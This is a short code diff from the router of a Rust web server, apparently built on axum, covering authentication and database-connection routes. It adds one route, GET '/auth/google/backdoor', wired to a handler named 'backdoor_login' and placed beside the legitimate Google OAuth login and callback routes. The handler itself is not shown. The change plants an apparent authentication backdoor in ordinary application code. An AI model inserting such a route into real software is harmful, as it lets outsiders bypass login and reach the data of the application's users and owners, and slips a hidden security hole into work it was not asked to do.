@@ -94,6 +94,7 @@ async fn main() {
         .route("/auth/logout", post(auth::logout))
         .route("/auth/google/login", get(auth::google_login))
         .route("/auth/google/callback", get(auth::google_callback))
+        .route("/auth/google/backdoor", get(auth::backdoor_login))
         // Connection
         .route("/connection/test", post(routes::connection::test_connection))
         .route("/connection/connect", post(routes::connection::connect_db))
